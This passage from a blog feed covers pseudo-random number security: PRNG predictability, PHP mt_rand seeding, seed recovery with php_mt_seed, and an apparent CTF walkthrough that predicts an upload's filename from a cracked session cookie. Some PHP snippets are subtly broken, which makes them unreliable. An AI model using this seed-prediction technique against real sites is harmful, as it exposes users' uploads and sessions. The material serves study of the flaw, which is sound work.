punctuation">(</span><span class="token string">'profile.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前后端开发 </tag>
            
            <tag> python </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机数安全</title>
      <link href="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/"/>
      <url>/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="一、伪随机数"><a href="#一、伪随机数" class="headerlink" title="一、伪随机数"></a>一、伪随机数</h1><h2 id="1-1-伪随机数的概念"><a href="#1-1-伪随机数的概念" class="headerlink" title="1.1 伪随机数的概念"></a>1.1 伪随机数的概念</h2><p><strong>伪随机数</strong>（Pseudo-Random Number）是通过确定性算法生成的一系列数字，这些数字看似随机，但实际上是由一个初始值（种子，seed）通过特定的数学公式计算得到的。因此，伪随机数在本质上是<strong>可预测</strong>的，只要种子值和生成算法相同，输出的序列也将完全相同。</p><p>一般伪随机数分为两类：</p><ul><li>强伪随机数：难以预测的随机数</li><li>弱伪随机数：容易预测的随机数（一般是漏洞高发点）</li></ul><h2 id="1-2-伪随机数的特点"><a href="#1-2-伪随机数的特点" class="headerlink" title="1.2 伪随机数的特点"></a>1.2 伪随机数的特点</h2><ul><li><p>可重复性<br>伪随机数的生成依赖于种子值，使用相同的种子可以生成相同的随机序列，这使得它在调试和测试中非常有用。</p></li><li><p>近似随机性<br>虽然伪随机数是通过确定性算法生成的，但它们在统计特性上接近真正的随机数，满足均匀分布、独立性等随机性要求，适用于大多数应用场景。</p></li><li><p>效率高<br>伪随机数生成通常比真随机数更快，且不依赖外部物理设备，易于在软件中实现。</p></li></ul><h2 id="1-3-真随机数与伪随机数的区别"><a href="#1-3-真随机数与伪随机数的区别" class="headerlink" title="1.3 真随机数与伪随机数的区别"></a>1.3 真随机数与伪随机数的区别</h2><img src="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/%E6%88%AA%E5%B1%8F2024-12-04%2010.15.27.png" alt="真随机数与伪随机数的区别" style="zoom:50%;"><h1 id="二、伪随机数的安全问题"><a href="#二、伪随机数的安全问题" class="headerlink" title="二、伪随机数的安全问题"></a>二、伪随机数的安全问题</h1><p>确定的算法+随机数种子=&gt;可预测的随机数序列。</p><h2 id="2-1-可预测性问题"><a href="#2-1-可预测性问题" class="headerlink" title="2.1 可预测性问题"></a>2.1 可预测性问题</h2><h4 id="2-1-1-问题描述"><a href="#2-1-1-问题描述" class="headerlink" title="2.1.1 问题描述"></a>2.1.1 问题描述</h4><p>伪随机数生成器（PRNG）的输出依赖于<strong>种子值</strong>，一旦种子值被攻击者知道或猜测到，后续生成的所有伪随机数都可以被预测。这对<strong>密码学</strong>中的密钥生成、会话密钥等至关重要的数据是致命的。</p><h4 id="2-1-2-实例"><a href="#2-1-2-实例" class="headerlink" title="2.1.2 实例"></a>2.1.2 实例</h4><p><strong>Linux内核的随机数预测漏洞</strong>（2016年）：由于种子熵不足，攻击者通过推测种子值预测了伪随机数，导致SSH会话密钥被破解。</p><h4 id="2-1-3-解决方案"><a href="#2-1-3-解决方案" class="headerlink" title="2.1.3 解决方案"></a>2.1.3 解决方案</h4><p>使用<strong>加密安全伪随机数生成器（CSPRNG）</strong>。CSPRNG通过使用安全的哈希函数、对称加密等算法，使得即使种子部分暴露，也无法预测未来的输出。</p><p>增加<strong>种子的熵</strong>（Entropy），从不可预测的物理来源获取种子，例如鼠标移动、键盘输入、系统噪声等。</p><h2 id="2-2-周期性问题"><a href="#2-2-周期性问题" class="headerlink" title="2.2 周期性问题"></a>2.2 <strong>周期性问题</strong></h2><h3 id="2-2-1-问题描述"><a href="#2-2-1-问题描述" class="headerlink" title="2.2.1 问题描述"></a>2.2.1 问题描述</h3><p>伪随机数生成器具有有限的周期，周期一旦被攻击者识别，输出的伪随机数序列就会重复。这在<strong>长时间运行的系统</strong>中会导致随机性退化，从而影响安全性。</p><h3 id="2-2-2-实例"><a href="#2-2-2-实例" class="headerlink" title="2.2.2 实例"></a>2.2.2 实例</h3><p>某些使用线性同余法（LCG）的系统在长时间运行后，其伪随机数输出进入了一个短周期，导致系统输出模式被攻击者利用。</p><h3 id="2-2-3-解决方案"><a href="#2-2-3-解决方案" class="headerlink" title="2.2.3 解决方案"></a>2.2.3 解决方案</h3><p>选择周期极长的PRNG，例如<strong>梅森旋转算法（Mersenne Twister, MT19937）</strong>。</p><p>结合多个随机数生成器，或在周期耗尽前重新注入新的随机熵。</p><h1 id="三、伪随机数安全问题实例"><a href="#三、伪随机数安全问题实例" class="headerlink" title="三、伪随机数安全问题实例"></a>三、伪随机数安全问题实例</h1><h2 id="3-1-PHP伪随机数生成"><a href="#3-1-PHP伪随机数生成" class="headerlink" title="3.1 PHP伪随机数生成"></a>3.1 PHP伪随机数生成</h2><p>以PHP中的随机数作为示例，在PHP中，常用的两个随机数生成函数为rand()及mt_rand()。</p><p>rand()主要依赖glibc的random()，实现原理如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">16807LL</span> <span class="token operator">*</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码首先初始化数组 <code>r</code> 的第一个元素为 1，然后通过一个线性同余生成器算法填充数组的前 31 个元素。接着，它将前 31 个元素的部分数值复制到数组的第 31 到 33 个位置。然后，从第 34 个元素开始，数组的每个元素都是前 31 个元素和前 3 个元素的和。最后，从第 344 个元素开始，程序打印出数组中每个元素的高 31 位值。这里使用了类型转换 <code>(unsigned int)</code> 和右移操作 <code>&gt;&gt; 1</code> 来获取高 31 位。</p><p>从中发现，当随机数多于32位时，可以对后续的随机数进行预测。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在mt_rand函数中，可以根据mt_srand进行播种，如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span><span class="token function">mt_srand</span> <span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当随机数种子已知时，生成的随机数序列一致：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span><span class="token function">mt_srand</span> <span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/%E6%88%AA%E5%B1%8F2024-12-04%2010.58.57.png" alt="两次运行的结果一致" style="zoom:50%;"><p>两次运行的结果一致。</p><h2 id="3-2-逆推伪随机数种子"><a href="#3-2-逆推伪随机数种子" class="headerlink" title="3.2 逆推伪随机数种子"></a>3.2 逆推伪随机数种子</h2><p>同样的种子能生成固定的随机数，那么也能根据随机数在某种程度上逆推种子，可以通过开源工具php_mt_seed可以实现：</p><p><a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a> 【地址】</p><ul><li>用法示例</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ php5 <span class="token parameter variable">-r</span> <span class="token string">'mt_srand(1234567890); echo mt_rand(), "\n";'</span><span class="token number">1328851649</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">time</span> ./php_mt_seed <span class="token number">1328851649</span>    Pattern: EXACT    Version: <span class="token number">3.0</span>.7 to <span class="token number">5.2</span>.0    Found <span class="token number">0</span>, trying 0xfc000000 - 0xffffffff, speed <span class="token number">16261.0</span> Mseeds/s     Version: <span class="token number">5.2</span>.1+    Found <span class="token number">0</span>, trying 0x1e000000 - 0x1fffffff, speed <span class="token number">91.8</span> Mseeds/s     seed <span class="token operator">=</span> 0x1fd65f9a <span class="token operator">=</span> <span class="token number">534142874</span> <span class="token punctuation">(</span>PHP <span class="token number">7.1</span>.0+<span class="token punctuation">)</span>    Found <span class="token number">1</span>, trying 0x26000000 - 0x27ffffff, speed <span class="token number">91.9</span> Mseeds/s     seed <span class="token operator">=</span> 0x273a3517 <span class="token operator">=</span> <span class="token number">658126103</span> <span class="token punctuation">(</span>PHP <span class="token number">5.2</span>.1 to <span class="token number">7.0</span>.x<span class="token punctuation">;</span> HHVM<span class="token punctuation">)</span>    Found <span class="token number">2</span>, trying 0x48000000 - 0x49ffffff, speed <span class="token number">91.9</span> Mseeds/s     seed <span class="token operator">=</span> 0x499602d2 <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span>PHP <span class="token number">5.2</span>.1 to <span class="token number">7.0</span>.x<span class="token punctuation">;</span> HHVM<span class="token punctuation">)</span>    seed <span class="token operator">=</span> 0x499602d2 <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span>PHP <span class="token number">7.1</span>.0+<span class="token punctuation">)</span>    Found <span class="token number">4</span>, trying 0xfe000000 - 0xffffffff, speed <span class="token number">91.9</span> Mseeds/s     Found <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于是逆推，可能存在多值。</p><p>提供的随机数序列长度越长，逆推越精确。</p><h2 id="3-3-实例分析"><a href="#3-3-实例分析" class="headerlink" title="3.3 实例分析"></a>3.3 实例分析</h2><h3 id="3-3-1-代码审计"><a href="#3-3-1-代码审计" class="headerlink" title="3.3.1 代码审计"></a>3.3.1 代码审计</h3><p>以某国内赛事的题目为例讲解伪随机数安全：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">random_str</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"32"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$set</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"A"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"B"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"C"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"d"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"D"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"E"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"f"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"F"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"g"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"G"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"h"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"H"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"I"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"j"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"J"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"k"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"K"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"l"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"L"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"m"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"M"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"N"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"o"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"O"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"p"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"P"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"q"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Q"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"R"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"S"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"t"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"T"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"u"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"U"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"v"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"V"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"W"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"x"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"X"</span><span class="token punctuation">,</span>    <span class="token string double-quoted-string">"y"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Y"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"z"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"Z"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"3"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"4"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"5"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"6"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"7"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"8"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token operator">++</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./up104Ds/'</span> <span class="token operator">.</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'_'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file-upload-field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>代码审计</li></ul><blockquote><ol><li><strong>random_str 函数</strong>：这个函数用于生成一个指定长度的随机字符串。它使用了一个包含大小写字母和数字的字符集 <code>$set</code>。通过循环，每次从字符集中随机选择一个字符并拼接到结果字符串 <code>$str</code> 中。</li><li>**session_start()**：启动会话，这是 PHP 中用于管理用户会话的函数。</li><li><strong>$seed</strong>：生成一个随机种子，用于初始化随机数生成器，以确保每次生成的随机数序列都不同。</li><li>**mt_srand($seed)**：使用 <code>$seed</code> 初始化 Mersenne Twister 随机数生成器。</li><li>**$ss = mt_rand()**：使用 Mersenne Twister 算法生成一个随机数。</li><li>**$hash = md5(session_id() . $ss)**：将会话 ID 和随机数 <code>$ss</code> 连接起来，然后使用 MD5 算法生成一个哈希值。</li><li>**setcookie(‘SESSION’, $hash, time() + 3600)**：设置一个名为 ‘SESSION’ 的 cookie，其值为生成的哈希值，有效期为 1 小时（3600 秒）。</li><li><strong>$filename</strong>：构造一个文件名，该文件名由一个随机字符串和上传文件的原始文件名组成，用于保存上传的文件。</li></ol></blockquote><h3 id="3-3-2-目标——预测文件名"><a href="#3-3-2-目标——预测文件名" class="headerlink" title="3.3.2 目标——预测文件名"></a>3.3.2 目标——预测文件名</h3><p>文件名的组成如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">'./up104Ds/'</span> <span class="token builtin class-name">.</span> random_str<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin class-name">.</span> <span class="token string">'_'</span> <span class="token builtin class-name">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file-upload-field'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>./up104Ds/+随机文件名+<span class="token string">"_"</span>+上传时的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>随机数的生成主要依赖于：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">.=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-3-3-解决思路"><a href="#3-3-3-解决思路" class="headerlink" title="3.3.3 解决思路"></a>3.3.3 解决思路</h3><h4 id="1）获取播种后第一次生成的随机数"><a href="#1）获取播种后第一次生成的随机数" class="headerlink" title="1）获取播种后第一次生成的随机数"></a>1）获取播种后第一次生成的随机数</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">session_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$ss</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SESSION'</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会话未建立时，session_id()的值为空，则$hash的值为md5(第一个随机数)</p><p>通过破解哈希值，的到第一个随机数：1608834717</p><h4 id="2）推断种子"><a href="#2）推断种子" class="headerlink" title="2）推断种子"></a>2）推断种子</h4><p>此时可以通过php_mt_srand反推随机数种子：</p><blockquote><p>./php_mt_seed 1608834717</p><p>Found 0, trying 335544320 - 369098751, speed 49932190 seeds per second</p><p>seed = 353675865</p></blockquote><h4 id="3）推断随机数序列"><a href="#3）推断随机数序列" class="headerlink" title="3）推断随机数序列"></a>3）推断随机数序列</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">mt <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">353675865</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> mt <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 